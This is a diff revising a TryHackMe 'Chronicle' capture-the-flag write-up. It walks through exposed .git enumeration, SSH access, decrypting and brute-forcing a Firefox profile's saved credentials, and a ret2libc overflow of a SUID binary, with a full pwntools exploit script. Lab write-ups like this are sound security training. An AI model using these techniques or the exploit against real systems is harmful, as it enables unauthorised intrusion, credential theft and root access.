@@ -1,72 +1,148 @@
-# Chronicle - TryHackMe Writeup
+# Chronicle — TryHackMe Writeup
 
-## Overview
-- **Platform:** TryHackMe
-- **Challenge:** Chronicle
-- **Category:** Web, Enumeration, Binary Exploitation
-- **Difficulty:** Medium
-
-## Tools Used
-- nmap, ffuf
-- git, scp
-- firefox_decrypt
-- GDB + pwndbg
-- pwntools, ROPgadget
-
-## What I Learned
-1. Fuzz everything — hidden directories can reveal gold
-2. `git log` to enumerate commit history for secrets
-3. `scp` to transfer files between machines
-4. `.mozilla` folders can contain sensitive credentials
-5. Buffer overflow → ret2libc exploitation
+> **TL;DR:** Exposed `.git` directory leaked an API key → credentials
+> retrieved → SSH access → Firefox credentials cracked → SUID binary
+> exploited via ret2libc → root shell
 
 ---
 
-## Step 1 — Enumeration
-Found two ports:
-- Port **80** — old website
-- Port **8081** — new website
+## Introduction
+Chronicle is a medium-difficulty TryHackMe room that chains together
+web enumeration, credential discovery, and binary exploitation to
+achieve root. What makes this room interesting is that each step
+naturally flows into the next — nothing feels forced.
 
-The new site had a password retrieval feature but required an API key.
+---
 
-Fuzzing port 80 revealed a hidden **`.git`** directory.
+## Recon
+Starting with a port scan revealed two web services running side by side...
 
-## Step 2 — Git Enumeration
-```bash
-git log        # view commit history
-git show <id>  # reveal hidden API key in old commit
-```
-Found a hardcoded API key in a previous commit.
+The newer site on **8081** had a password retrieval feature, but it
+required an API key I didn't have yet. So I turned my attention to
+the older site on **80**.
 
-## Step 3 — Credential Discovery
-Used the username + API key against the endpoint and retrieved credentials for user **tommy**.
+Fuzzing for hidden directories revealed something interesting:
+\```bash
+ffuf -u http://<ip>/.FUZZ -w /usr/share/wordlists/dirb/common.txt
+# Found: .git
+\```
 
-Fuzzing for more usernames with ffuf revealed additional users.
+A `.git` directory exposed on a web server means one thing —
+the entire commit history is accessible.
 
-## Step 4 — Initial Access
-SSH login with tommy's credentials:
-```bash
+---
+
+## Credential Discovery
+Enumerating the git history:
+\```bash
+git log        # list all commits
+git show <id>  # inspect suspicious commit
+\```
+
+One commit contained a hardcoded API key that was later removed —
+but git never forgets. Armed with the API key and a username,
+the retrieval endpoint returned valid credentials.
+
+---
+
+## Initial Access — tommy
+With credentials in hand, SSH gave us a foothold:
+\```bash
 ssh tommy@<ip>
-```
-Found **user.txt** — first flag!
+cat user.txt  # first flag!
+\```
 
-## Step 5 — Lateral Movement
-Found another user **carlJ** with a `.mozilla` folder containing Firefox profile data.
+---
 
-Transferred the Firefox profile to local machine:
-```bash
-scp -r tommy@<ip>:/home/carlJ/.mozilla ./mozilla
-```
+## Lateral Movement — carlJ
+Enumerating the system revealed another user, **carlJ**, with
+a `.mozilla` folder — Firefox profiles store saved passwords
+in encrypted form, but they can be decrypted offline.
 
-Used `firefox_decrypt` to extract credentials:
-```bash
-python3 firefox_decrypt.py ./mozilla/firefox/<profile>
-# Option 2 requires a master password
-```
+Transferred the profile to my local machine:
+\```bash
+scp -r tommy@<ip>:/home/carlJ/.mozilla/firefox ./firefox
+\```
 
-Automated the password cracking with a Python script using rockyou.txt wordlist. Found carlJ's password!
+Used `firefox_decrypt` but it required a master password.
+Rather than guess manually, I automated it with a Python script
+that tried each password from rockyou.txt until it succeeded.
 
-## Step 6 — Privilege Escalation via Buffer Overflow
-SSH'd as carlJ and found a SUID binary `smail` in the mailing folder.
+Found carlJ's password and SSHed in.
+
+---
+
+## Privilege Escalation — ret2libc Buffer Overflow
+Inside carlJ's home directory was a `mailing/` folder containing
+a SUID binary called `smail`. Running it showed two options —
+Send Message and Change Signature.
+
+The word "signature" with no visible limit is a red flag for
+buffer overflow.
 
 ### Binary Analysis
+\```bash
+checksec --file=./smail
+\```
+\```
+NX:    enabled   → shellcode won't work, need ret2libc
+PIE:   disabled  → gadget addresses are static
+Stack: no canary → can overflow freely
+\```
+
+### Finding the Offset
+The buffer was **64 bytes** + **8 bytes** for RBP = **72 bytes**
+before we control the return address.
+
+### Building the ROP Chain
+Since NX is enabled we can't run shellcode. Instead we:
+1. Return into `system()` from libc
+2. Pass `/bin/sh` as the argument via the `pop rdi` gadget
+
+\```
+[72 x 'A'][ret gadget][pop rdi][/bin/sh address][system()]
+     |           |          |           |              |
+  overflow   alignment   set RDI    argument       shell!
+\```
+
+The `ret` gadget is needed for 16-byte stack alignment —
+without it `system()` crashes on a `movaps` instruction.
+
+### Exploit
+\```python
+from pwn import *
+
+p = process('./smail')
+
+libc_base = 0x7ffff79e2000
+system    = libc_base + 0x4f550
+binsh     = libc_base + 0x1b3e1a
+POP_RDI   = 0x4007f3
+RET       = 0x400556
+
+payload  = b'A' * 72
+payload += p64(RET)
+payload += p64(POP_RDI)
+payload += p64(binsh)
+payload += p64(system)
+
+p.sendlineafter(b'What do you wanna do', b'2')
+p.sendlineafter(b'Write your signature...', payload)
+p.interactive()
+\```
+
+---
+
+## Conclusion
+Chronicle was a great room for chaining multiple techniques together.
+The key takeaways:
+- Always fuzz for `.git` directories on web servers
+- Firefox profiles are goldmines for credentials
+- SUID binaries with unchecked input are privesc gold
+
+## What I Learned
+- `git log` for commit history enumeration
+- `scp` for file transfers
+- Firefox credential decryption
+- ret2libc buffer overflow exploitation
+- ROP chains and stack alignment in 64-bit
